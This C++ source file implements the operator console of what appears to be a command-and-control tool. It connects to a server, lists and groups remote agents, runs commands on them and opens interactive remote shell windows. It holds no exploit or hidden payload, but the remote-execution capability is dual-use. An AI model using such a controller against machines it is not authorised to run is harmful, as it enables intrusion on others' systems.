#include "Controller.hpp"


Controller::Controller(const std::string& szIp, INT iPort) {
    szServerIp = szIp;
    iServerPort = iPort;
    bIsRunning = TRUE;
    sock = INVALID_SOCKET;
}


Controller::~Controller() {
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
    }
    WSACleanup();
}


BOOL Controller::Connect()
{
    WSADATA wsaData;
    sockaddr_in serverAddr{};

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";

        return FALSE;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();

        return FALSE;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(iServerPort);

    if (inet_pton(AF_INET, szServerIp.c_str(), &serverAddr.sin_addr) != 1) {
        std::cerr << "Invalid IP address\n";
        closesocket(sock);
        WSACleanup();

        return FALSE;
    }

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection to server failed\n";
        closesocket(sock);
        WSACleanup();

        return FALSE;
    }

    std::cout << "[+] Connected to " << szServerIp << ":" << iServerPort << "\n";
    return TRUE;
}

VOID Controller::Run()
{
    while (bIsRunning) {
        ControllerCommandReq commandReq = inputHandler.CreateCommandObject();
        HandleCommandObject(commandReq);
    }
}

VOID Controller::HandleCommandObject(ControllerCommandReq commandReq)
{
    std::string szOutputBuffer;
    CommandType commandType = commandReq.GetCommandType();

    if (commandType == CommandType::Close || commandType == CommandType::List || commandType == CommandType::GroupAdd ||
        commandType == CommandType::GroupRemove || commandType == CommandType::GroupCreate || commandType == CommandType::GroupDelete ||
        commandType == CommandType::ListGroup || commandType == CommandType::ListGroupNames || commandType == CommandType::Quit) 
    {
        SendCommand(commandReq);
        ReceiveData(szOutputBuffer);
        std::cout << szOutputBuffer;
    }

    if (commandType == CommandType::Unknown) {
        std::cout << "[!] Unrecognized command!\n";
        ShowMan();
    }

    if (commandType == CommandType::OpenCmdWindow) {
        std::cout << "[!] CMD command!\n";
        // validate ip:port / groupname 
        SendCommand(commandReq);
        ReceiveData(szOutputBuffer);
        if (szOutputBuffer != "Found") {
            std::cout << "[!] Could not find " << commandReq.GetTargetAgent() << commandReq.GetGroupName() << "\n";
        }
        else {
            szOutputBuffer = "C:\\>";
            arrWindowSessionThreads.emplace_back(&Controller::OpenSessionWindow, this, commandReq, szOutputBuffer);
        }
    }

    if (commandType == CommandType::Man) {
        ShowMan();
    }
}

BOOL Controller::SendCommand(ControllerCommandReq commandReq)
{
    INT iBytesSent;
    nlohmann::json j = commandReq;
    std::string szCommand;

    if (sock == INVALID_SOCKET) {
        return FALSE;
    }
    szCommand = j.dump(4);
    //std::cout << szCommand << "\n";
    iBytesSent = send(sock, szCommand.c_str(), static_cast<int>(szCommand.size()), 0);
    return iBytesSent == szCommand.size();
}

BOOL Controller::ReceiveData(std::string& szOutBuffer) {

    INT iBytesReceived;
    CHAR carrBuffer[4096];

    if (sock == INVALID_SOCKET) {
        return FALSE;
    }

    uint32_t uiNetMessageLen;
    uint32_t uiHostMessageLen;
    iBytesReceived = recv(sock, (LPSTR)&uiNetMessageLen, sizeof(uiNetMessageLen), 0);

    if (iBytesReceived > 0) {
        szOutBuffer.clear();
        uiHostMessageLen = ntohl(uiNetMessageLen);
        INT iTotalBytesReceived = 0;

        if (uiHostMessageLen > 20 * 1024 * 1024) {
            return FALSE;
        }

        while (iTotalBytesReceived < uiHostMessageLen) {
            iBytesReceived = recv(sock, carrBuffer, sizeof(carrBuffer) - 1, 0);
            carrBuffer[iBytesReceived] = '\0';
            szOutBuffer += carrBuffer;
            iTotalBytesReceived += iBytesReceived;
        }

        std::cout << "received:\n" << szOutBuffer;
        return TRUE;

    }

    return FALSE;
    //INT iBytesReceived;
    //CHAR carrBuffer[4096];

    //if (sock == INVALID_SOCKET) {
    //    return FALSE;
    //}

    //iBytesReceived = recv(sock, carrBuffer, sizeof(carrBuffer) - 1, 0);

    //if (iBytesReceived > 0) {
    //    carrBuffer[iBytesReceived] = '\0';
    //    szOutBuffer = carrBuffer;
    //}

    //return FALSE;
}

VOID Controller::OpenSessionWindow(ControllerCommandReq commandReq, std::string szInitialCwd)
{
    BOOL bIsChildCreated;
    CHAR carrSelfPath[MAX_PATH];
    HANDLE hChildStdoutRead;
    HANDLE hChildStdoutWrite;
    HANDLE hChildStdinRead;
    HANDLE hChildStdinWrite;
    std::string szWindowCommand;
    std::string szCommandOutput;
    std::string szProcessCommandLine;
    STARTUPINFOA siStartInfo{};
    SECURITY_ATTRIBUTES saAttr{};
    PROCESS_INFORMATION piProcInfo{};

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create pipes for stdout
    CreatePipe(&hChildStdoutRead, &hChildStdoutWrite, &saAttr, 0);
    SetHandleInformation(hChildStdoutRead, HANDLE_FLAG_INHERIT, 0);

    // Create pipes for stdin
    CreatePipe(&hChildStdinRead, &hChildStdinWrite, &saAttr, 0);
    SetHandleInformation(hChildStdinWrite, HANDLE_FLAG_INHERIT, 0);

    // Set up the process startup info
    siStartInfo.cb = sizeof(STARTUPINFOA);
    siStartInfo.hStdError = hChildStdoutWrite;
    siStartInfo.hStdOutput = hChildStdoutWrite;
    siStartInfo.hStdInput = hChildStdinRead;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create child process
    GetModuleFileNameA(NULL, carrSelfPath, MAX_PATH);
    szProcessCommandLine = std::string(carrSelfPath) + " " + CHILD_PROCESS_FLAG;
    bIsChildCreated = CreateProcessA(
        NULL,
        &szProcessCommandLine[0],
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &siStartInfo,
        &piProcInfo
    );

    if (!bIsChildCreated) {
        std::cerr << "Failed to start PowerShell.\n";
        exit(1);
    }

    // Close unused pipe ends
    CloseHandle(hChildStdoutWrite);
    CloseHandle(hChildStdinRead);

    WriteToChild(hChildStdinWrite, szInitialCwd);

    while (bIsRunning) {
        if (!ReadFromChild(hChildStdoutRead, szWindowCommand)) {
            break;
        }

        SendCommand(ControllerCommandReq(CommandType::Execute, commandReq.GetTargetAgent(), commandReq.GetGroupName(), szWindowCommand));
        ReceiveData(szCommandOutput);

        if (!WriteToChild(hChildStdinWrite, szCommandOutput + "\n" + szInitialCwd)) {
            break;
        }
    }
}

BOOL Controller::ReadFromChild(HANDLE hChildStdoutRead, std::string& szCommand)
{
    BOOL bIsReadSuccess;
    CHAR carrReadBuffer[4096];
    DWORD dwBytesRead;
    bIsReadSuccess = ReadFile(hChildStdoutRead, carrReadBuffer, sizeof(carrReadBuffer) - 1, &dwBytesRead, NULL);

    if (bIsReadSuccess) {
        carrReadBuffer[dwBytesRead] = '\0';
        szCommand = std::string(carrReadBuffer);
    }

    return bIsReadSuccess;
}

BOOL Controller::WriteToChild(HANDLE hChildStdinWrite, const std::string& szData)
{
    BOOL bIsWriteSuccess;
    DWORD dwBytesWritten;
    bIsWriteSuccess = WriteFile(hChildStdinWrite, szData.c_str(), szData.length(), &dwBytesWritten, NULL) || dwBytesWritten != szData.length();

    return bIsWriteSuccess;
}


VOID Controller::ShowMan()
{
    std::cout << "[*] quit - Kill server and all connections\n";
    std::cout << "[*] close IP:PORT - Close connection with IP:PORT\n";
    std::cout << "[*] cmd COMMAND IP:PORT - Execute COMMAND on IP:PORT\n";
    std::cout << "[*] list - Show all active connections\n";
    std::cout << "[*] group-create - Create a new control group\n";
    std::cout << "[*] group-delete GROUPNAME - Delete GROUPNAME control group\n";
    std::cout << "[*] group-add GROUPNAME IP:PORT - Add IP:PORT to GROUPNAME control group\n";
    std::cout << "[*] group-remove GROUPNAME IP:PORT - Remove IP:PORT from GROUPNAME control group\n";
    std::cout << "[*] group-list GROUPNAME - Print the members of GROUPNAME control group\n";
    std::cout << "[*] group-cmd GROUPNAME COMMAND - Execute COMMAND on members of GROUPNAME control group\n";
    std::cout << "[*] groups - Print all active control groups\n";
    std::cout << "[*] man - Show this man page\n";
}


